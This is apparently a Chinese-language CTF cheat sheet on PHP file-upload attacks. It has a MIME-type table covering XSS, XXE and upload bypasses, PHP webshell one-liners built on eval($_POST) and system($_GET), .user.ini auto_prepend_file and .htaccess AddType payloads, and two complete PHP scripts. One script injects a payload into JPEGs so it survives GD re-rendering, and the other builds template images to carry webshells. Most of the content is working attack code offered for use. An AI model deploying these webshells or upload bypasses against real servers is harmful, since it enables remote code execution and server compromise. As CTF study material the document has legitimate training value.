## MIME type

| MIME Type (媒体类型)                                                                    | 基础说明              | CTF 视角与安全要点 (CTF Context)                                                                                                                                                                                                    |
| :---------------------------------------------------------------------------------- | :---------------- | :--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **`text/html`**                                                                     | HTML 网页文档         | **XSS 的主要载体**。如果文件上传点允许上传或直接在浏览器中渲染此类型，通常会导致存储型 XSS。                                                                                                                                                                         |
| **`image/svg+xml`**                                                                 | SVG 矢量图           | **CTF 明星类型**。由于 SVG 本质是 XML 格式，可以嵌入 `<script>` 标签，常用于绕过常规图片限制以实现 **XSS**，或尝试 **XXE (XML 外部实体注入)**。                                                                                                                           |
| **`text/plain`**                                                                    | 纯文本文件             | 默认文本格式。若服务器未设置 `X-Content-Type-Options: nosniff`，浏览器可能会进行 **MIME 嗅探**，将恶意的 `text/plain` 当作 `text/html` 或 `text/javascript` 执行。                                                                                               |
| **`application/octet-stream`**                                                      | 未知或通用的二进制流        | 默认的二进制文件下载。在文件上传题目中，若后端对 Content-Type 校验不严，常需要将其修改为 `image/jpeg` 等可信类型进行**上传绕过**。                                                                                                                                            |
| **`multipart/form-data`**                                                           | 多部分表单数据           | 文件上传时的请求体类型。CTF 中经常需要通过修改其 `boundary`、文件名后缀或利用解析差异（如双写、特殊字符截断）来绕过安全防护。                                                                                                                                                       |
| **`text/javascript`**                                                               | JavaScript 脚本     | 客户端脚本执行。常用于 XSS 载荷或绕过 CSP 限制。                                                                                                                                                                                                |
| **`application/javascript`**<br>**`application/x-javascript`**<br>*(及其他历史遗留 JS 类型)* | 历史遗留或非标准的 JS 媒体类型 | 浏览器为了兼容性仍会解析执行。在 CTF 过滤了 `text/javascript` 的场景下，可尝试使用这些不常见的别名进行 **Bypass**。                                                                                                                                                  |
| **`application/json`**                                                              | JSON 格式数据         | API 常见交互格式。涉及反序列化漏洞、JSON 注入或 CSRF 绕过（某些防护机制可能只防范传统表单提交，不防范 JSON 提交）。                                                                                                                                                         |
| **`image/gif`**                                                                     | GIF 格式图片          | **文件上传绕过（图片马）**。常配合文件头魔术字 `GIF89a`（十六进制 `47 49 46 38 39 61`）绕过后端的文件内容检测（如 `getimagesize()` 函数限制）。                                                                                                                            |
| **`image/png`**<br>**`image/jpeg`**                                                 | 常见位图图像格式          | 文件上传题目中，常作为白名单类型。参赛者需要将 Webshell 的 Content-Type 修改为此类进行欺骗，或利用图片库解析漏洞（如 ImageMagick 漏洞）。                                                                                                                                      |
| **`application/zip`**<br>**`application/x-zip-compressed`**                         | ZIP 压缩包（标准与非标准）   | 涉及 **Zip Slip 漏洞**（目录遍历写入）、解压木马。在绕过文件上传限制时，两者常用于进行**客户端/服务端 MIME 校验绕过**（如利用 WAF 或后端黑白名单对非标准类型的漏判）。                                                                                                                           |
| **`multipart/byteranges`**                                                          | 范围请求响应类型          | 伴随 `206 Partial Content` 状态码使用。在一些涉及敏感信息泄露或任意文件读取的题目中，可以通过控制 `Range` 请求头来分段读取目标文件的敏感内容。                                                                                                                                      |
| **`text/css`**                                                                      | CSS 样式表           | 偶尔用于 CSS 注入攻击，在严格模式下（如启用 `nosniff`），若 CSS 文件未返回此类型，浏览器将拒绝加载。                                                                                                                                                                 |
| **`application/pdf`**                                                               | PDF 文档            | 涉及 PDF XSS、PDF 钓鱼，或通过 PDF 内部的 JS 引擎执行特定恶意行为。                                                                                                                                                                                 |
| **`application/x-rar-compressed`**                                                  | RAR 压缩包           | RAR 文件格式。服务器未正确配置时可能识别为 `octet-stream`，有时考点在于利用解包逻辑的漏洞。                                                                                                                                                                      |
| **application/x-www-form-urlencoded**                                               | URL 编码表单数据        | **标准表单提交与编码特性**。HTML 表单默认的 POST 格式。在 CTF 中常用于传递常规交互参数。可利用后端（如 PHP）在接收此类型时**自动进行 URL 解码**的特性，安全传输包含 \x00（如私有属性反序列化）或特殊符号的 Payload。同时，由于其默认支持跨域表单提交，常作为 **CSRF 漏洞**的载体。此外，可利用 PHP 解析引擎对此格式参数名的替换特性（如将 . 或空格替换为 _）来绕过部分 WAF 检测。 |
## 等效php标签
短输出标签（Short Echo Tag）
```php
<?= 一句话木马或命令; ?>
```
- **等效于**：`<?php echo ...; ?>`
- **示例**：`<?= whoami; ?>` （利用反引号执行系统命令）

短标签（Short Open Tag）
```php
<? 命令; ?>
```
- **示例**：`<? eval($_POST['cmd']); ?>`
- **限制条件**：必须在全局配置文件 `php.ini` 中开启 `short_open_tag = On`。
- **注意**：在现代 PHP（PHP 7、PHP 8）中，由于它容易和 XML 声明（`<?xml ... ?>`）冲突，很多默认生产环境是关闭它的，但在 CTF 靶机中经常会故意开启。

Script 标签（仅限旧版本 PHP < 7.0）
```php
<script language="php">
    eval($_POST['cmd']);
</script>
```
## `.php` 别名
- **`.phtml`**：早期的 PHP 混合 HTML 模板文件，现代 Web 服务器默认也经常配置解析它。
- **`.php3` / `.php4` / `.php5` / `.php7`**：带版本号的 PHP 后缀。虽然现在很多系统运行的是 PHP 8+，但为了向后兼容，有些服务器的配置文件里依然保留了对这些老版本后缀的解析规则。
- **`.phtm`**：类似于 `.phtml` 的变体。
- **`.phps`**：通常用于显示 PHP 源代码（PHP Source）。在某些特定配置错误下，它也可能被直接执行，或者被用来读取敏感代码。

## `.user.ini`
`.user.ini` 是 PHP 自 5.3.0 版本起引入的一个**局部配置文件**（用户自定义的 `php.ini`）。
它的设计初衷是给网站开发者一个便捷通道：在没有权限修改服务器全局 `php.ini` 的情况下，允许你针对**某个特定目录**动态调整 PHP 的配置参数。

- 常见payload
1. 上传 `avatar.jpg`
```php
<?php eval($_REQUEST['cmd']); ?>
```
2. 上传 `.user.ini`
```ini
auto_prepend_file = avatar.jpg
# 空格不是必须的
auto_prepend_file=avatar.jpg
# 扩展名不是必须的，当然上传的 avatar 也没扩展名
auto_prepend_file=avatar

# 更直接一点
# auto_prepend_file 内部用的是include，所以也可以用data协议
# 解码之后是 <?system($_GET[0])?>
auto_prepend_file=data://text/plain,%3C%3Fsystem%28%24_GET%5B0%5D%29%3F%3E

```

## `.htaccess`
`.htaccess`（全称 **Hypertext Access**）是 **Apache Web 服务器**中的一个分布式配置文件。

简单来说，它是 Apache 给网站管理员留下的一个“快捷后门”：在没有权限修改服务器全局主配置文件（如 `httpd.conf`）的情况下，管理员可以通过在特定目录下放一个 `.htaccess` 文件，来**动态改变该目录及其子目录的服务器行为**。

- 常见payload

- 上传 `.htaccess`
```
AddType application/x-httpd-php .jpg
```
- **`AddType`**：这是 Apache 的一个指令，意思是“添加一种文件类型的映射规则”。它告诉服务器：“当遇到某种后缀的文件时，请用我指定的类型去处理它。”
- **`application/x-httpd-php`**：这是 PHP 解释器在 Apache 中的“身份标识”（MIME 类型）。Apache 只要看到这个标识，就会把文件转交给 PHP 引擎去翻译、执行，而不是直接当成普通文本或图片下载。
- **`.jpg`**：这是你指定的**文件后缀名**。
组合起来的字面意思就是：**给 `.jpg` 后缀绑定“PHP 脚本”的身份。**

```php
<?php
/*
    将 Payload 注入 JPG 图片的算法，保证经过 PHP 的 imagecopyresized() 和 imagecopyresampled()
    处理后 Payload 仍然保留。前提是原始图片和处理后的图片尺寸、质量相同。

    使用步骤:
    1. 上传一张图片到服务器
    2. 下载服务器处理后的图片，执行:
       php jpg_payload.php <图片名.jpg>
    3. 如果注入成功，会生成 payload_<图片名>.jpg，将其再次上传
    4. 访问 download.php?image=<新文件名> 触发 include() 执行 Payload

    注意:
    - 如果二次处理后 Payload 被破坏，尝试更换 Payload 内容（如开头加字符）
    - 如果脚本输出 "Something's wrong"，换一张初始图片重试

    原作者: Sergey Bobrov @Black2Fan
    参考: https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/
*/

$miniPayload = "<?=phpinfo();?>";

if (!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) {
    die('php-gd is not installed');
}

if (!isset($argv[1])) {
    die('用法: php jpg_payload.php <图片名.jpg>');
}

set_error_handler("custom_error_handler");

// 遍历不同长度的 null 填充，找到能让 GD 接受 payload 的长度
for ($pad = 0; $pad < 1024; $pad++) {
    $nullbytePayloadSize = $pad;
    $dis = new DataInputStream($argv[1]);
    $outStream = file_get_contents($argv[1]);
    $extraBytes = 0;
    $correctImage = TRUE;

    if ($dis->readShort() != 0xFFD8) {
        die('不是有效的 JPEG 文件（SOI 标记错误）');
    }

    while ((!$dis->eof()) && ($dis->readByte() == 0xFF)) {
        $marker = $dis->readByte();
        $size = $dis->readShort() - 2;
        $dis->skip($size);

        if ($marker === 0xDA) {  // SOS 标记 — 图像数据开始
            $startPos = $dis->seek();

            // 在熵数据开头插入 payload + null 填充
            $outStreamTmp =
                substr($outStream, 0, $startPos) .
                $miniPayload .
                str_repeat("\0", $nullbytePayloadSize) .
                substr($outStream, $startPos);

            // 测试 GD 是否能解码
            checkImage('_' . $argv[1], $outStreamTmp, TRUE);

            if ($extraBytes !== 0) {
                // GD 报错有额外字节，调整数据长度使其匹配
                while ((!$dis->eof())) {
                    if ($dis->readByte() === 0xFF) {
                        if ($dis->readByte() !== 0x00) {  // [修复] 加了括号
                            break;
                        }
                    }
                }
                $stopPos = $dis->seek() - 2;
                $imageStreamSize = $stopPos - $startPos;
                $outStream =
                    substr($outStream, 0, $startPos) .
                    $miniPayload .
                    substr(
                        str_repeat("\0", $nullbytePayloadSize) .
                            substr($outStream, $startPos, $imageStreamSize),
                        0,
                        $nullbytePayloadSize + $imageStreamSize - $extraBytes
                    ) .
                    substr($outStream, $stopPos);
            } elseif ($correctImage) {
                // GD 没有报错，直接使用
                $outStream = $outStreamTmp;
            } else {
                break;
            }

            // 最终验证
            if (checkImage('payload_' . $argv[1], $outStream)) {
                die('Success! 已生成 payload_' . $argv[1]);
            } else {
                break;
            }
        }
    }
}

@unlink('payload_' . $argv[1]);
die('Something\'s wrong — 遍历 1024 个 pad 值后仍无法注入');

// ---- 辅助函数 ----

function checkImage($filename, $data, $unlink = FALSE) {
    global $correctImage;
    file_put_contents($filename, $data);
    $correctImage = TRUE;
    imagecreatefromjpeg($filename);
    if ($unlink)
        unlink($filename);
    return $correctImage;
}

function custom_error_handler($errno, $errstr, $errfile, $errline) {
    global $extraBytes, $correctImage;
    $correctImage = FALSE;
    if (preg_match('/(\d+) extraneous bytes before marker/', $errstr, $m)) {
        if (isset($m[1])) {
            $extraBytes = (int)$m[1];
        }
    }
}

class DataInputStream {
    private $binData;
    private $order;
    private $size;

    public function __construct($filename, $order = false, $fromString = false) {
        $this->binData = '';
        $this->order = $order;
        if (!$fromString) {
            if (!file_exists($filename) || !is_file($filename))
                die('文件不存在 [' . $filename . ']');
            $this->binData = file_get_contents($filename);
        } else {
            $this->binData = $filename;
        }
        $this->size = strlen($this->binData);
    }

    public function seek() {
        return ($this->size - strlen($this->binData));
    }

    public function skip($skip) {
        $this->binData = substr($this->binData, $skip);
    }

    public function readByte() {
        if ($this->eof()) {
            die('意外到达文件末尾');
        }
        $byte = substr($this->binData, 0, 1);
        $this->binData = substr($this->binData, 1);
        return ord($byte);
    }

    public function readShort() {
        if (strlen($this->binData) < 2) {
            die('意外到达文件末尾');
        }
        $short = substr($this->binData, 0, 2);
        $this->binData = substr($this->binData, 2);
        if ($this->order) {
            $short = (ord($short[1]) << 8) + ord($short[0]);
        } else {
            $short = (ord($short[0]) << 8) + ord($short[1]);
        }
        return $short;
    }

    public function eof() {
        return !$this->binData || (strlen($this->binData) === 0);
    }
}
```

用于生成成功率高的图片
```php
<?php
/**
 * 生成二次渲染不死的图片马模板
 * 用法:
 *   php gen_shell_img.php                          # 默认纯红 200x200 q=75
 *   php gen_shell_img.php black 300 85             # 纯黑 300x300 q=85
 *   php gen_shell_img.php 255 0 0 200 200 75 out   # 自定义RGB
 */

$color = $argv[1] ?? 'red';
$width = intval($argv[2] ?? 200);
$height = intval($argv[3] ?? $width);
$quality = intval($argv[4] ?? 75);
$output = $argv[5] ?? 'shell_template.jpg';

// 预设颜色
$presets = [
    'red'     => [255, 0, 0],
    'green'   => [0, 255, 0],
    'blue'    => [0, 0, 255],
    'black'   => [0, 0, 0],
    'gray'    => [128, 128, 128],
];

if (is_numeric($color) && isset($argv[2]) && isset($argv[3])) {
    // 自定义 RGB 模式
    $rgb = [intval($color), intval($argv[2]), intval($argv[3])];
    $width = intval($argv[4] ?? 200);
    $height = intval($argv[5] ?? $width);
    $quality = intval($argv[6] ?? 75);
    $output = $argv[7] ?? 'shell_template.jpg';
} elseif (isset($presets[$color])) {
    $rgb = $presets[$color];
} else {
    die("未知颜色: $color，可选: " . implode(', ', array_keys($presets)) . "\n");
}

$img = imagecreatetruecolor($width, $height);
$c = imagecolorallocate($img, $rgb[0], $rgb[1], $rgb[2]);
imagefill($img, 0, 0, $c);
imagejpeg($img, $output, $quality);
imagedestroy($img);

echo "[+] 生成: $output\n";
echo "    尺寸: {$width}x{$height}, Quality: $quality, 颜色: RGB({$rgb[0]},{$rgb[1]},{$rgb[2]})\n";
echo "    大小: " . filesize($output) . " bytes\n";
```
